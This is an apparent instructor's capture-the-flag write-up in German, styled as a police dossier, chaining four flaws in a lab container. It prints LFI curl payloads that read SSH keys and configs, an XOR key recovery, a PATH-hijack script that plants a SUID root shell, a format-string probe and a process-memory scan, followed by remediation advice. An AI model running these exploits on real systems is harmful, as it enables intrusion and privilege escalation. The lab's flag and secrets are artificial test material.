# DOSSIER SÛRETÉ Nº 1897-C — "L'HÉRITAGE DE CAGLIOSTRO"

**Ermittlungsdossier der Pariser Sûreté, Abteilung für digitale Spuren**
**Zielobjekt:** Rechenzentrum des Hauses d'Ermont ("dermont-target")
**Status:** Vollständig kompromittiert, alle vier Phasen verifiziert
**Klassifizierung:** Dozenten-Writeup — Offensive Security, Praxisprojekt

---

## 1. Management Summary

Baron Édouard d'Ermont betrieb auf einem einzelnen, scheinbar gut
gehärteten Server (Container `dermont-target`, siehe
[`docs/ARCHITECTURE.md`](../ARCHITECTURE.md)) eine Infrastruktur zur
Aufbewahrung von Erpressermaterial und gestohlenen Kunstwerken. Die
Ermittlung zeigt eine durchgängige Kompromittierungskette über vier
Stufen, vom anonymen Web-Zugriff bis zur vollständigen Entschlüsselung
des finalen Tresors:

| # | Phase | Schwachstellenklasse | Ergebnis |
|---|---|---|---|
| 1 | Die Fassade der Galerie | LFI / unauthentifizierter Debug-Endpoint | SSH-Key `ganimard` + Fragment A |
| 2 | Der Geheimsender | Repeating-Key-XOR (zu kurzer Schlüssel) | SSH-Key `lupin_associate` |
| 3 | Die Meistermaskerade | sudo-Fehlkonfiguration (`!secure_path`) + PATH-Hijack | Root-Shell |
| 4 | Der Tresor des Grafen | Secret-Material im Prozessspeicher | Flag + Lupins Abschiedsbrief |

**Kernaussage:** Keine der vier Schwachstellen ist für sich exotisch —
in Kombination ergeben sie jedoch eine vollständige
End-to-End-Kompromittierung ohne jede Form von Social Engineering. Alle
im Folgenden beschriebenen Payloads wurden gegen eine lauffähige
Instanz verifiziert (reale Secrets pro Testlauf, kein angenommenes
Verhalten).

---

## 2. Phase 1 — Penetration der Außengrenze ("Die Fassade der Galerie")

### 2.1 Aufklärung

Die öffentliche Seite (`/`) zeigt nur Katalogtexte. `robots.txt`
verrät — ironischerweise durch den Versuch, Pfade vor Suchmaschinen zu
verstecken — zwei interessante Verzeichnisse:

```
Disallow: /admin_backup/
Disallow: /api/
```

Ergänzend findet Verzeichnis-Fuzzing (`ffuf`/`gobuster`) denselben
Pfad sowie den konkreten Endpoint:

```
ffuf -u http://TARGET/FUZZ -w common.txt
...
admin_backup                    [Status: 200]
api                             [Status: 403/404, aber Unterpfad existiert]
```

`/admin_backup/` ist, wie vermutet, ein **Honeypot**: jede Eingabe im
Login-Formular führt zu einer Spottkarte ("Zu einfach, mon ami!").
Dieser Pfad ist eine bewusste Sackgasse und keine Schwachstelle.

### 2.2 Die eigentliche Schwachstelle: LFI in `preview.php`

Endpoint: `GET /api/v1/gallery/preview?img=<name>`

```php
$blacklist = ['../', '..\\', '/etc/passwd', '/etc/shadow'];
foreach ($blacklist as $pattern) {
    $img = str_ireplace($pattern, '', $img);
}
if (basename($img) === $img) {
    $target = $gallery_dir . '/' . $img;      // sicherer Pfad
} else {
    $target = $img;                           // <-- UNGEFILTERT an include()
}
ob_start();
$ok = @include($target);
```

Der Entwickler wollte offenbar "externe Vorschauen" erlauben und prüft
nur, ob der Parameter einen Schrägstrich enthält. Jeder Wert mit `/`
wird **ungefiltert** an `include()` übergeben — die Blacklist greift
nur bei den drei literalen Mustern, nicht bei absoluten Pfaden oder
PHP-Stream-Wrappern.

**PoC — Konfig-Datei außerhalb des Webroots lesen:**

```bash
curl "http://TARGET/api/v1/gallery/preview?img=/etc/dermont-config/service-accounts.json"
```

```json
{
  "ganimard_ssh_private_key": "-----BEGIN PRIVATE KEY-----\n...",
  "vault_fragment_a": "BV1sdMojRGcvoNRg"
}
```

Damit erhält man direkt den privaten SSH-Schlüssel des Service-Accounts
`ganimard` sowie **Fragment A** (benötigt in Phase 4).

**Hinweis zu `php://filter` / Wrapper-Abuse:** Die Lehrbuch-Variante
`php://filter/convert.base64-encode/resource=/proc/self/environ` wurde
beim Bau dieser Challenge gegen ein echtes Apache+mod_php-Setup
getestet und funktioniert dort **nicht zuverlässig**: Apaches
`mpm_prefork`-Worker wechseln per *in-process* `setuid()` von `root`
zu `www-data`, **ohne** anschließendes `execve()`. Der Kernel löscht
dabei das `dumpable`-Flag des Prozesses (`man proc`,
Abschnitt `/proc/[pid]/environ`), wodurch der Worker sein **eigenes**
`/proc/self/environ` nicht mehr lesen darf — auch nicht mit `root`-Rechten
im `Set-UID`-Sinn, da es sich um eine reine `setuid()`-Transition ohne
Re-Exec handelt. Deshalb liegt das Secret bewusst in einer Config-Datei
statt in der Umgebung. Der Wrapper selbst bleibt als Technik relevant,
z. B. um den Quelltext von `preview.php` gefahrlos (ohne Codeausführung)
zu lesen:

```bash
curl "http://TARGET/api/v1/gallery/preview?img=php://filter/convert.base64-encode/resource=/var/www/html/api/v1/gallery/preview.php" \
  | base64 -d
```

### 2.3 Automatisiertes Solve-Script

[`phase1-galerie/solve/solve.py`](../../phase1-galerie/solve/solve.py)
führt beide Schritte aus und legt den Schlüssel als `id_ganimard`
(chmod 600) sowie Fragment A als `vault_fragment_a.txt` ab.

```
$ python3 solve.py http://TARGET
[+] SSH-Key für 'ganimard' -> id_ganimard
[+] Fragment A (für Phase 4) -> vault_fragment_a.txt: BV1sdMojRGcvoNRg
$ ssh -i id_ganimard ganimard@TARGET
ganimard@dermont-target:~$
```

---

## 3. Phase 2 — Lateral Movement & Kryptoanalyse ("Der Geheimsender")

### 3.1 Der verdeckte Kanal

Als `ganimard` zeigt `ss -tln` (bzw. ein Portscan von innen) einen
Dienst auf `127.0.0.1:9001` — von außen unerreichbar. Ein lokaler
SSH-Tunnel macht ihn zugänglich:

```bash
ssh -i id_ganimard -L 9001:127.0.0.1:9001 ganimard@TARGET
```

Verbindet man sich nun lokal auf Port 9001, liefert der Dienst alle
zwei Sekunden einen gerahmten, verschlüsselten Datensatz
(4-Byte-Längenpräfix + Ciphertext).

### 3.2 Die Krypto-Schwachstelle: Repeating-Key-XOR mit 6-Byte-Schlüssel

Verschlüsselung erfolgt über das Legacy-Tool `cipher_stamp`
([`phase2-geheimsender/cipher-tool/cipher_stamp.c.tmpl`](../../phase2-geheimsender/cipher-tool/cipher_stamp.c.tmpl)):

```c
static const unsigned char LUPIN_FIELD_KEY[] = "__KEY__"; // 6 Byte
buf[j] ^= LUPIN_FIELD_KEY[ctr % 6];
```

Mathematisch: Für Klartext `P`, Ciphertext `C` und periodischen
Schlüssel `K` der Länge 6 gilt `C[i] = P[i] XOR K[i mod 6]`. Da XOR
involutorisch ist (`C[i] XOR K[i mod 6] = P[i]`), genügt die Kenntnis
*eines* passenden Schlüssel-Bytes pro Phase, um die gesamte Periode zu
rekonstruieren. Zwei unabhängige Angriffswege:

**Weg A — Binary-Reversing (wie vom Dozenten verlangt):**

```bash
ganimard@dermont-target:~$ ls -la /opt/lupin/cipher_stamp
-rwxr-xr-x 1 root root ... /opt/lupin/cipher_stamp
ganimard@dermont-target:~$ strings /opt/lupin/cipher_stamp | grep -E '^.{6}$'
rWEJ5o
```

Der Schlüssel liegt im Klartext im `.rodata`-Segment des Binaries und
ist für jeden Nutzer mit Lesezugriff auf die Datei sofort sichtbar
(kein `gdb` nötig, reicht mit `strings`; `gdb -p <pid>` funktioniert am
laufenden Prozess ebenso).

**Weg B — Known-Plaintext-Angriff ohne Dateizugriff:**

Jede Nachricht beginnt mit dem bekannten, fest formatierten JSON-Präfix
`{"from": "lupin", "to": "associate", "ts": `. XOR des Ciphertexts mit
diesem bekannten Klartext liefert direkt die ersten Keystream-Bytes,
aus denen sich die Periodenlänge (hier 6) und der volle Schlüssel
rekonstruieren lassen — implementiert in
[`phase2-geheimsender/solve/solve.py`](../../phase2-geheimsender/solve/solve.py)
(`recover_key()`).

```
$ python3 solve.py --host 127.0.0.1 --port 9001 --recover-key --messages 1
[+] XOR-Key rekonstruiert: b'rWEJ5o'
[+] Session-Credentials für lupin_associate -> id_lupin_associate
```

Beide Wege wurden gegen eine echte Instanz verifiziert und liefern
denselben, pro Deployment zufälligen Schlüssel.

---

## 4. Phase 3 — Rechteausweitung ("Die Meistermaskerade")

### 4.1 Befund

```
lupin_associate@dermont-target:~$ sudo -l
Matching Defaults entries for lupin_associate on dermont-target:
    env_reset, mail_badpass, secure_path=..., !secure_path
User lupin_associate may run the following commands on dermont-target:
    (root) NOPASSWD: /usr/local/bin/vault_backup
```

Zwei Dinge fallen auf: `vault_backup` darf ohne Passwort als `root`
ausgeführt werden, UND die `sudoers`-Regel
([`phase3-maskerade/sudoers.d/lupin_associate`](../../phase3-maskerade/sudoers.d/lupin_associate))
setzt `Defaults:lupin_associate !secure_path` — die globale
`secure_path`-Absicherung (die normalerweise die `PATH`-Variable beim
`sudo`-Aufruf auf einen festen, sicheren Wert zurücksetzt) ist für
genau diesen Nutzer deaktiviert.

### 4.2 Code-Analyse von `vault_backup`

[`phase3-maskerade/vault_backup.c`](../../phase3-maskerade/vault_backup.c)
enthält zwei Schwachstellen:

```c
printf(label);   // (1) Format-String-Vulnerability
...
snprintf(cmd, sizeof(cmd), "tar czf ... data 2>/dev/null", (long)time(NULL));
system(cmd);     // (2) "tar" ohne absoluten Pfad
```

**(1) Format-String:** `label` (Nutzereingabe) wird direkt als
Format-String an `printf()` übergeben. PoC (Information Disclosure,
kein Absturz nötig):

```
$ /usr/local/bin/vault_backup '%x.%x.%x.%x.%x.%x.%x.%x'
[vault_backup] Sicherung gestartet. Label: 62708e50.0.0.ade04b20.0.62709488...
```

Das legt Stack-Inhalte offen (hier u. a. die Adresse von
`legacy_note`). Dies ist der im Dozenten-Briefing geforderte
Nachweis der Format-String-Lücke — **nicht** der verlässliche
Lösungsweg, da ein `%n`-Write stark von ASLR/Compiler-Flags abhängt.

**(2) PATH-Hijacking (verlässlicher Lösungsweg):** `system()` ruft
`tar` ohne absoluten Pfad auf. Da `!secure_path` für
`lupin_associate` gilt, wird die vom Angreifer kontrollierte `PATH`
unverändert an den `sudo`-Kontext durchgereicht.

**Exploit** ([`phase3-maskerade/solve/exploit.sh`](../../phase3-maskerade/solve/exploit.sh)):

```sh
WORKDIR="$(mktemp -d)"
cat > "$WORKDIR/tar" <<'INNER'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
INNER
chmod +x "$WORKDIR/tar"
PATH="$WORKDIR:$PATH" sudo /usr/local/bin/vault_backup "Routine-Sicherung"
```

`sudo` löst `tar` über die präparierte `PATH` auf das eigene Skript
auf, welches als `root` läuft und eine SUID-root-Bash hinterlegt:

```
$ /tmp/rootbash -p -c 'id'
uid=30034(lupin_associate) gid=30034(lupin_associate) euid=0(root) groups=30034(lupin_associate)
```

**Negativkontrolle:** Ohne diesen Weg (direkter Aufruf ohne `sudo`
oder mit intaktem `secure_path`) bleibt der Prozess bei `uid=1000`,
das Backup-Tool läuft nicht als `root` — das Gate ist nicht
versehentlich offen.

---

## 5. Phase 4 — Forensik & Asservaten-Analyse ("Der Tresor des Grafen")

### 5.1 Lokalisierung von `vault_daemon`

```
# cat /run/vault_daemon.pid
12685
```

`vault_daemon` läuft als `root`, hält **Fragment C** permanent im
Prozessspeicher (`vault_daemon.c`, Puffer mit Markern
`VAULTC_BEGIN:...:VAULTC_END`). Ein **naives**
`strings /proc/<pid>/mem` funktioniert nicht zuverlässig: der Kernel
berichtet für `/proc/<pid>/mem` immer `st_size = 0`, und ein
sequenzielles `read()` ab Offset 0 liefert ohne vorheriges `seek()` in
eine tatsächlich gemappte Region sofort EOF bzw. einen I/O-Fehler.

**Korrekte Technik:** `/proc/<pid>/maps` auswerten und jede lesbare
Region gezielt per `seek()`+`read()` aus `/proc/<pid>/mem` holen
(äquivalent zu `gdb -p <pid>` → `find &buf,+N,"VAULTC_BEGIN"`).
Implementiert in
[`phase4-tresor/solve/solve.py`](../../phase4-tresor/solve/solve.py)
(`find_fragment_c()`). Dies **erfordert root** — ohne Phase 3 schlägt
der Zugriff mit `PermissionError: [Errno 13]` fehl (verifiziert).

```
# python3 solve.py --fragment-a BV1sdMojRGcvoNRg --fragment-b rWEJ5o
[*] Scanne Prozessspeicher von vault_daemon (pid=12685) ...
[+] Fragment C gefunden: s8K6rAbmE4gXWeffsU2l
[*] Entschlüssele Tresor ...

===== FLAG =====
FLAG{l_heritage_de_cagliostro_I4snCsMxMw9C}

===== LUPIN_LETTER =====
Mon cher Ganimard, ...
```

### 5.2 Schlüsselableitung des Tresors

`/opt/vault/tresor.db.enc` wurde beim Containerstart erzeugt
([`phase4-tresor/build/encrypt_vault.py`](../../phase4-tresor/build/encrypt_vault.py),
Krypto in
[`phase4-tresor/crypto/vault_crypto.py`](../../phase4-tresor/crypto/vault_crypto.py),
Bibliothek: **PyCA `cryptography`**, s. Abschnitt 6.4):

```
key_material = FragmentA || "|" || FragmentB || "|" || FragmentC
key          = PBKDF2-HMAC-SHA256(key_material, salt, 200_000 Iterationen, 32 Byte)
Datei-Layout = salt(16) || iv(16) || AES-256-CBC(PKCS7(sqlite_db), key, iv)
```

Die resultierende SQLite-Datenbank enthält zwei Zeilen: die Flagge und
Lupins Abschiedsbrief, der die Überführung des Barons ankündigt.

---

## 6. Remediation & Hardening

| # | Schwachstelle | Sofortmaßnahme | Strukturelle Maßnahme |
|---|---|---|---|
| 1 | LFI in `preview.php` | `include()` auf eine Allowlist fester Dateinamen beschränken (`basename()`-Check **ohne** Ausnahme für Pfade mit `/`) | Keine Nutzerdaten je an `include()`/`require()` übergeben; stattdessen Dateien über eine serverseitige ID-zu-Pfad-Tabelle auflösen |
| 1 | Secrets in Config-Dateien außerhalb des Webroots | Dateirechte verschärfen (0600, nur vom jeweiligen Service-User lesbar, nicht `www-data`) | Secrets-Management (Vault/SOPS) statt Dateien auf Disk |
| 2 | Repeating-Key-XOR, 6-Byte-Schlüssel | Dienst sofort abschalten/ersetzen | Etablierte, geprüfte Kryptografie verwenden (z. B. AES-GCM via PyCA `cryptography` oder libsodium), keine Eigenentwicklung "Feldchiffren" |
| 2 | Secret im Binary (`strings`-lesbar) | — (hier bewusst für Lehrzwecke) | Schlüssel nie im Code/Binary, sondern aus einem Secret-Store zur Laufzeit laden |
| 3 | `sudo` + `!secure_path` | `secure_path`-Override aus der `sudoers`-Regel entfernen | `sudo`-Policies regelmäßig auditieren (`sudo -l` für alle Nutzer), Prinzip der minimalen Rechte |
| 3 | Format-String in `vault_backup` | `printf("%s", label)` statt `printf(label)` | Statische Analyse (`-Wformat=2 -Werror`) im CI erzwingen |
| 3 | `system()` ohne absoluten Pfad | `/usr/bin/tar` statt `tar` | Keine Shell-Aufrufe für privilegierte Operationen; falls unvermeidbar, `execve()` mit festem, vollqualifiziertem Pfad und bereinigter Umgebung |
| 4 | Secret im Prozessspeicher ohne Schutz | — (hier bewusst für Lehrzwecke) | `mlock()`/`madvise(MADV_DONTDUMP)` für Secret-Puffer, Speicher nach Gebrauch mit `explicit_bzero()` löschen, Hardware-Security-Module für langlebige Schlüssel |
| Allgemein | Einzelner Host für alle Dienste | Netzwerksegmentierung (separate VLANs/Namespaces je Dienst) | Zero-Trust-Architektur: jeder Dienst authentifiziert sich einzeln, keine implizite Lateral-Movement-Fläche über einen gemeinsamen Host |

---

## 7. Anhang

### 7.1 Vollständige Pivot-Kette (verifiziert, realer Testlauf)

```
anon ──(LFI: /etc/dermont-config/service-accounts.json)──> ganimard (SSH)
ganimard ──(SSH-Tunnel 9001 + XOR-Bruch "rWEJ5o")──> lupin_associate (SSH)
lupin_associate ──(sudo + PATH-Hijack vault_backup)──> root
root ──(Memory-Scan vault_daemon, Fragment C "s8K6rAbmE4gXWeffsU2l")──> Tresor
Fragmente A+B+C ──(PBKDF2+AES-256-CBC)──> FLAG{l_heritage_de_cagliostro_...}
```

### 7.2 Dateimanifest

Siehe Repo-Root; zentrale Artefakte:

```
docs/ARCHITECTURE.md                         Gesamtarchitektur, Anti-Cheat-Design
infra/Dockerfile, entrypoint.sh               Containerbau, Dynamic-Secrets-Logik
phase1-galerie/app/api/v1/gallery/preview.php LFI-Endpoint
phase2-geheimsender/cipher-tool/*.tmpl        Verwundbare Feldchiffre (Template)
phase3-maskerade/vault_backup.c               Format-String + PATH-Hijack
phase4-tresor/daemon/vault_daemon.c           Memory-resident Key-Fragment
phase4-tresor/crypto/vault_crypto.py          PBKDF2/AES-256-CBC (PyCA cryptography)
*/solve/*.py, *.sh                            Verifizierte Lösungs-/Exploit-Skripte
```

### 7.3 Verwendete Abhängigkeiten (außerhalb der Standardbibliothek)

| Paket | Version | Zweck | Risikobewertung |
|---|---|---|---|
| `cryptography` (PyPI, PyCA) | `>=42,<51` | AES-256-CBC + PBKDF2-HMAC für den finalen Tresor | Offizieller, eindeutiger Name auf PyPI (kein Typosquatting-Risiko), von der Python Cryptographic Authority aktiv gepflegt, breiter Produktionseinsatz. Debian/Ubuntu-Paket `python3-cryptography` wird im Container-Image bevorzugt (kein `pip` zur Laufzeit nötig). |

Alle übrigen Komponenten (PHP, Apache, OpenSSH, sudo, SQLite, GCC)
sind Standard-Distributionspakete ohne zusätzliches
Typosquatting-/Wartungsrisiko.

---

*Ende des Dossiers. — Inspektor Ganimard, Sûreté, für den Dienstgebrauch.*
